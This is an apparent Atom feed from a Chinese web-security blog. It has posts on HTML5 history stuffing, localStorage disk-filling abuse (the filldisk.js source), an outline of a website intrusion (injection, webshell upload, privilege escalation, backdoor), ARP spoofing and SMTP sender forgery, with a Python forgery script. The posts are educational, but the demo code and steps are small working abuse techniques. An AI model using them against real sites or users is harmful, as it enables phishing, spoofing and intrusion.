<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Web Security | lxghost'hell]]></title>
  <link href="http://lxghost.github.com/blog/categories/web-security/atom.xml" rel="self"/>
  <link href="http://lxghost.github.com/"/>
  <updated>2013-03-05T17:07:49+08:00</updated>
  <id>http://lxghost.github.com/</id>
  <author>
    <name><![CDATA[lxghost]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[HTML5之地址栏历史填充 ]]></title>
    <link href="http://lxghost.github.com/blog/2013-03-05/html5-history-stuffing/"/>
    <updated>2013-03-05T17:00:00+08:00</updated>
    <id>http://lxghost.github.com/blog/2013-03-05/html5-history-stuffing</id>
    <content type="html"><![CDATA[<p>刚刚看到的 <a href="http://upnorthtrip.com/historystuffing/">http://upnorthtrip.com/historystuffing/</a>
HTML5提供了操作浏览器历史记录的API<br/>
通过</p>

<pre><code>history.pushState([data],[title],[url])
</code></pre>

<p>方法能够将指定的URL添加到浏览器历史记录<br/>
比如你push了sampleurl.com，当你下次在地址栏输入sample时，浏览器就会给出提示</p>

<!-- more -->


<p>
demo很简单
<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var historyStuffing = {&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>//初始化，浏览器支持就填充历史记录，否则提示不支持
</span><span class='line'>init: function () {
</span><span class='line'>    if (this.checkSupport) {
</span><span class='line'>        this.stuffHistory(this.keywords());
</span><span class='line'>    } else {
</span><span class='line'>        alert("Sorry, your browser doesn't support History API, therefore the demo will not work.");
</span><span class='line'>    }
</span><span class='line'>},
</span><span class='line'>
</span><span class='line'>//检查浏览器支持，需要存在window.history和history.pushState才行
</span><span class='line'>checkSupport: function () {
</span><span class='line'>    return !!(window.history &amp;&amp; history.pushState);
</span><span class='line'>},
</span><span class='line'>
</span><span class='line'>//填充列表中的url到历史记录
</span><span class='line'>stuffHistory: function (data) {
</span><span class='line'>    for (var i = 0; i &lt; data.length; i++) {
</span><span class='line'>        window.history.pushState(null, null, "/?domain=" + data[i]);
</span><span class='line'>        if (window.chrome) {
</span><span class='line'>            document.title = "&lt;- CLICK HERE";
</span><span class='line'>        } else {
</span><span class='line'>            document.title = "CLICK HERE";
</span><span class='line'>        }
</span><span class='line'>        if(i == data.length-1){
</span><span class='line'>            document.title = "History stuffing with HTML5 - upnorthtrip";
</span><span class='line'>            window.history.pushState(null, null, "/historystuffing");
</span><span class='line'>            document.getElementById("status").innerHTML = "&lt;br /&gt;Completed!&lt;br /&gt;Now type a domain such as &lt;b&gt;chase.com&lt;/b&gt; in your location bar.";
</span><span class='line'>        }
</span><span class='line'>    }
</span><span class='line'>},
</span><span class='line'>
</span><span class='line'>keywords: function () {
</span><span class='line'>    return Array(要填充的url列表)
</span><span class='line'>}
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>}</span></code></pre></td></tr></table></div></figure></notextile></div>
这也带来了风险，比如钓鱼页面利用关键字填充，或者url跳转到子域名进行<a href="http://ph4ntasy.com/Secret-cookie-Stuffing.html">cookie stuffing</a><br/>
也可以填充通用的搜索关键字how,why之类的，总之就是增加用户访问的可能性</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HTML5之localStorage]]></title>
    <link href="http://lxghost.github.com/blog/2013-03-03/html5-localstorage/"/>
    <updated>2013-03-03T21:48:00+08:00</updated>
    <id>http://lxghost.github.com/blog/2013-03-03/html5-localstorage</id>
    <content type="html"><![CDATA[<p>在HTML5之前，本地存储的唯一方案就是<a href="http://book.51cto.com/art/201301/378118.htm">cookie</a>，相信大家都懂的。<br/>
不过它的局限性也很明显，大小限制和会过期。<br/>
所以在HTML5中新增了更好的本地存储功能，本地存储localStorage，在内存中就是sessionStorage，两者的唯一区别就是<strong>寿命</strong>，前者存在于本地文件，一直存在除非自己删除；后者存在于内存，随着浏览器的关闭而消失。<br/>
保存的值都是<strong>文本类型</strong>，在使用时注意转换成对应的类型</p>

<!--more-->


<p><strong>支持的浏览器</strong>有
<img src="http://ww1.sinaimg.cn/large/a74ecc4cjw1e2cpztm82kj.jpg" alt="支持的浏览器" /><br/>
<strong>用法</strong>很简单<br/>
localStorage["key"]="value"/ localStorage.setItem("key", "value") /  localStorage.key=value 设置<br/>
localStorage["key"] / localStorage.getItem("key") /  localStorage.key 调用<br/>
localStorage.clear() 清除所有  localStorage.removeItem("key") 删除<br/>
localStorage.length 已经存在的变量数目<br/>
localStorage.key(n) 返回第n个变量<br/>
它是<strong>以域区分</strong>的，每个域名作为一个源，比如<a href="http://www.sample.com/a.html">www.sample.com/a.html</a>的数据可以被<a href="http://www.sample.com/">www.sample.com</a>的其他页面访问<br/>
不同的电脑/用户/浏览器都是不同的源<br/>
每个源的存储<strong>大小限制</strong>为chrome 2.5MB / firefox&amp;opera 5MB / IE 10MB<br/>
还有没制定方案的数据库标准IndexdDB，起始大小为50MB</p>

<p>但是问题也随之产生了，利用localStorage可以<strong>无限占用硬盘空间</strong>(<a href="https://github.com/feross/filldisk.js">https://github.com/feross/filldisk.js</a>)<br/>
因为除了firefox，其他浏览器<strong>对于子域的存储没有按标准进行限制</strong>，利用1.sample.com， 2.sample.com，3.sample.com就可以无限产生数据<br/>
可以点<a href="http://www.filldisk.com/">这里</a>感受一下
代码也很简单
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>filldisk.js </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="err">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="c1">//产生循环字符串</span>
</span><span class='line'>  <span class="kd">function</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">string</span><span class="p">,</span> <span class="nx">count</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span><span class="nx">count</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">array</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">array</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="cm">/**</span>
</span><span class='line'><span class="cm">     * 获得子域名的数字</span>
</span><span class='line'><span class="cm">     * http://5.filldisk.com  --&gt;  5</span>
</span><span class='line'><span class="cm">     * @type {Number}</span>
</span><span class='line'><span class="cm">     */</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">frameNum</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hostname</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^([^.]+)\./i</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="cm">/**</span>
</span><span class='line'><span class="cm">     * reclaim变量表示是否删除</span>
</span><span class='line'><span class="cm">     * 如果为真，删除本地存储</span>
</span><span class='line'><span class="cm">     * @type {Boolean}</span>
</span><span class='line'><span class="cm">     */</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">shouldReclaim</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/reclaim=(\w+)/i</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">shouldReclaim</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">shouldReclaim</span> <span class="o">=</span> <span class="p">(</span><span class="nx">shouldReclaim</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;true&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="cm">/**</span>
</span><span class='line'><span class="cm">     * 生成2.5mb的字符串.</span>
</span><span class='line'><span class="cm">     * 一个字符串为1字节(b),循环产生100b, 1kb, 10kb, 1000kb, 1mb, 2.5mb</span>
</span><span class='line'><span class="cm">     */</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n10b</span> <span class="o">=</span> <span class="s1">&#39;0123456789&#39;</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n100b</span> <span class="o">=</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">n10b</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n1kb</span> <span class="o">=</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">n100b</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n10kb</span> <span class="o">=</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">n1kb</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n100kb</span> <span class="o">=</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">n10kb</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n999kb</span> <span class="o">=</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">n1kb</span><span class="p">,</span> <span class="mi">999</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">n2500kb</span> <span class="o">=</span> <span class="nx">repeat</span><span class="p">(</span><span class="nx">n100kb</span><span class="p">,</span> <span class="mi">25</span><span class="p">)</span>
</span><span class='line'>    <span class="cm">/**</span>
</span><span class='line'><span class="cm">     * js是utf-16字符串，所以产生5mb的localStorage</span>
</span><span class='line'><span class="cm">     */</span>
</span><span class='line'>    <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">shouldReclaim</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">localStorage</span><span class="p">[</span><span class="s1">&#39;filldisk&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span><span class='line'>        <span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="s1">&#39;filldisk&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="cm">/**</span>
</span><span class='line'><span class="cm">         * 判断浏览器，Opera的限制为2.5mb</span>
</span><span class='line'><span class="cm">         */</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;Opera&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">localStorage</span><span class="p">[</span><span class="s1">&#39;filldisk&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">n2500kb</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">localStorage</span><span class="p">[</span><span class="s1">&#39;filldisk&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">n999kb</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;local storage exception&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="k">return</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">//发送所在的子域名数字</span>
</span><span class='line'>    <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">frameNum</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span>
</span><span class='line'>    <span class="c1">//跳转到下一个子域</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">shouldReclaim</span> <span class="o">&amp;&amp;</span> <span class="nx">frameNum</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">frameNum</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;.filldisk.com/frame.html?reclaim=&#39;</span> <span class="o">+</span> <span class="nx">shouldReclaim</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">shouldReclaim</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="nx">frameNum</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;.filldisk.com/frame.html&#39;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">})()</span>
</span><span class='line'><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
可以预见HTML5的强大, 比如File API能读取客户端文件用js进行处理，但是必然会带来全新的安全问题，前端是个新的战场:)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Hackers Target and Hack Your Site]]></title>
    <link href="http://lxghost.github.com/blog/2012-07-03/how-hackers-target-and-hack-your-site/"/>
    <updated>2012-07-03T01:08:00+08:00</updated>
    <id>http://lxghost.github.com/blog/2012-07-03/how-hackers-target-and-hack-your-site</id>
    <content type="html"><![CDATA[<p><a href="http://resources.infosecinstitute.com/hacking-a-wordpress-site/">How Hackers Target and Hack Your Site</a> 是一篇非常棒入侵的标准教程</p>

<p>撸一下思路</p>

<!-- more -->


<p>1.确定目标</p>

<p>hack-test.com 这网站还能玩小游戏...</p>

<p>2.信息收集</p>

<p>IP查询 同IP网站 WHOIS查询 <a href="http://ip.chinaz.com/">站长之家</a></p>

<p>web应用指纹识别 使用<a href="http://nmap.org/dist/nmap-5.51-setup.exe">Nmap</a></p>

<p>-sV 应用程序版本 -O 系统指纹 -A 上述两项</p>

<p>3.漏洞扫描</p>

<p>企业级扫描器 Acunetix webvulnerabilityscanner8</p>

<p>注入检测 <a href="http://downloads.sourceforge.net/sqlmap/sqlmap-0.9.zip">sqlmap</a></p>

<p>4.渗透提权</p>

<p>步骤如下</p>

<p>进谷歌 找注入 没注入 就旁注</p>

<p>没旁注 用Oday 没Oday 猜目录</p>

<p>没目录 就嗅探 爆账户 找后台</p>

<p>传小马 放大马 拿权限 挂页面</p>

<p>放暗链 清数据 清日志 留后门</p>

<p>文章里是这样的</p>

<p>(1)注入获得用户名和密码</p>

<p>(2)<a href="http://www.onlinehashcrack.com/free-hash-reverse.php">解开md5</a></p>

<p>(3)通过wp插件写入一句话 上传大马</p>

<p>(4)反向连接 获得执行命令行权限 执行linux命令</p>

<p>ld - 获得用户名和用户组</p>

<p>pwd - 获得当前路径</p>

<p>uname -a 获得系统版本信息</p>

<p>(5)<a href="http://www.exploit-db.com/">exploit-db</a>寻找提权脚本</p>

<p>(6)执行提权脚本 获得root</p>

<p>(7)留下后门 远程控制</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[地址解析协议]]></title>
    <link href="http://lxghost.github.com/blog/2012-03-24/address-resolution-protocol/"/>
    <updated>2012-03-24T23:43:00+08:00</updated>
    <id>http://lxghost.github.com/blog/2012-03-24/address-resolution-protocol</id>
    <content type="html"><![CDATA[<p>假设你叫小明(本地主机)，住在一个大院子(本地局域网)，有很多邻居(网络邻居)，门口有个看门的李大爷(网关)。当你想要找院子里的某个小朋友玩，只要大喊一声他的名字(ping),他听到了就会回你。你要找院子里的人，只要知道他家门牌号码(MAC地址)，就可以找到他。你想找外面的人，但妈妈不让你出去，必须通过李大爷帮你联系。如果你要找另一个院子里(跨域网络)的同学小强(远程主机)，他的妈妈也不让他出去。那里也有一个看门的王大爷(另一个网关)，小明要找小强，必须通过李大爷联系王大爷(路由)。这两个院子里的故事太多，以后慢慢讲。。。</p>

<!-- more -->


<p>    要理解网络协议，最好使用协议分析器对数据包进行分析，<a href="http://www.wireshark.org/download.html">wireshark</a>是不错的选择。</p>

<p><img src="../../../images/uploads/arp1.jpg">
简单的说，ARP协议回答了一个问题 IP是XX.XX.XX.XX(图中的192.168.1.1)的网卡，他的MAC/物理地址(图中的00:21:27:6a:25:0c)是什么。MAC地址是网卡绑定的唯一标识符，局域网内的主机之间互相通信，必须通过MAC地址。系统会对ARP数据进行缓存，不过10分钟后会重建。在cmd下输入arp -a可以查看。</p>

<p><img src="../../../images/uploads/arp2.jpg"><br/>
下面是ARP报文的结构</p>

<p><img src="../../../images/uploads/arp3.jpg"><br/>
ARP的过程如下，假设A,B,C为局域网的3台主机</p>

<ol>
<li>当A要访问B时，此时ARP缓存表为空，所以要进行一次广播，图中目标为全f，确定B的地址。</li>
<li>B 和C都会收到这个广播。因为是广播，所以网络上的任何一个节点都要对该帧进行进一步处理。于是C检查该帧的协议类型，发现是0x0806H(ARP协议)，便把该帧的帧头去掉，检查其IP头，发现是发向192.168.1.1 的ARP 报文而不是自己的，于是将该报文丢弃。</li>
<li>B收到这个帧后发现是个广播，所以也会检查该帧的协议类型，发现是ARP协议，便把该帧的帧头去掉，露出IP头，发现该报文是发给自己的，就再检查操作类型，发现是请求，于是便读取该帧的发送者MAC 和发送者IP，把它们作为ARP 响应的目的MAC和目的IP 发送回去，这就是为什么ARP 请求是广播，而响应是单播的原因。图中目标MAC为全0，就是留空让接受者填写。</li>
<li>当A收到来自B的ARP单播响应时，首先检查该帧的目的MAC 是不是自己，发现匹配，于是再检查协议类型，发现是ARP 协议，于是去掉二层帧头，送到IP 层，IP 协议发现目的IP地址是自己，于是进一步检查操作类型，发现是响应，于是读取发送者MAC 和IP，把它们记录进ARP缓存表。</li>
</ol>


<p>    知道了原理，我们可以通过伪造ARP响应，进行ARP欺骗，使得请求的主机相信属于别人的IP是你的。如果伪造成网关，那么别人自然不能上网了，有兴趣的同学可以慢慢研究...至于防御也很简单，本地arp -s绑定，安装arp防火墙，在路由器绑定ip-mac-端口。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[简单邮件传输协议]]></title>
    <link href="http://lxghost.github.com/blog/2012-03-09/simple-mail-transfer-protocol/"/>
    <updated>2012-03-09T20:16:00+08:00</updated>
    <id>http://lxghost.github.com/blog/2012-03-09/simple-mail-transfer-protocol</id>
    <content type="html"><![CDATA[<p>SMTP用于传播电子邮件消息，是最被滥用的协议之一了..因为年代久远 设计时并没考虑安全问题。</p>

<p>很多人用来 <a href="http://deadfake.com/Default.aspx">fake email</a></p>

<p>SMTP服务器(MTAs)负责处理发送的邮件 默认监听端口25/TCP</p>

<p>POP3服务器或IMAP服务器负责处理收到的邮件</p>

<p>使用telnet 连接SMTP服务器就可以发送电子邮件</p>

<p>使用ASCII文本进行通信 由客户端发送命令 服务端返回响应消息</p>

<!-- more -->


<p>常用命令有</p>

<p>HELO - 介绍自己
EHLO - 介绍自己并要求扩展模式
MAIL FROM - 指明发件人
RCPT TO - 指明收件人
DATA - 确认邮件内容（前三行应为To、From和邮件主题）
RSET - 重置
QUIT - 退出进程
HELP - 命令帮助
VRFY - 验证地址
EXPN - 扩展地址
比如 telnet smtp.qq.com 25</p>

<p><img src="../../../images/uploads/smtp1.jpg"></p>

<p>1.ehlo lxghost - 申明 需要身份验证</p>

<p>如果是不需要身份验证的SMTP服务器 可以用helo申明 不过网上提供的都需要验证 除非自己搭建</p>

<p>2.auth login - 开始验证</p>

<p>3.输入邮箱名和密码 需要base64编码</p>

<p>4.mai from - 这里可以输入任意的地址</p>

<p>从上图可以看出服务端进行了验证 确保定义的发件地址和认证登录的地址一样</p>

<p>但是 小型的SMTP都没有采取安全措施 像学校公司之类的都可以伪造发件人</p>

<p><img src="../../../images/uploads/smtp2.jpg"></p>

<p>5.rcpt to - 输入接收地址</p>

<p>6.data - 开始编辑</p>

<p>可以定义标题 发送地址 接受地址 内容 都是显示在邮件主体里</p>

<p>换行后一个点表示编辑结束</p>

<p>等待发送完成 quit</p>

<p>用python的smtplib实现
<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>coding:utf-8&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>import smtplib&lt;br/>
</span><span class='line'>from email.mime.text import MIMEText&lt;br/>
</span><span class='line'>mail_host = "smtp地址"&lt;br/>
</span><span class='line'>mail_user = "登陆邮箱名"&lt;br/>
</span><span class='line'>mail_pwd = "登陆密码"&lt;br/>
</span><span class='line'>send_from = "想伪造的发件人&lt;br/>
</span><span class='line'>send_to = "收件人"&lt;br/>
</span><span class='line'>msg = MIMEText("内容")&lt;br/>
</span><span class='line'>msg['From'] = send_from&lt;br/>
</span><span class='line'>msg['To'] = send_to&lt;br/>
</span><span class='line'>msg['Subject'] = "title"&lt;br/>
</span><span class='line'>s = smtplib.SMTP()&lt;br/>
</span><span class='line'>s.connect(mail_host)&lt;br/>
</span><span class='line'>s.login(mail_user ,mail_pwd)&lt;br/>
</span><span class='line'>s.sendmail(send_from, send_to, msg.as_string())&lt;br/>
</span><span class='line'>s.close()</span></code></pre></td></tr></table></div></figure></notextile></div></p>
]]></content>
  </entry>
  
</feed>
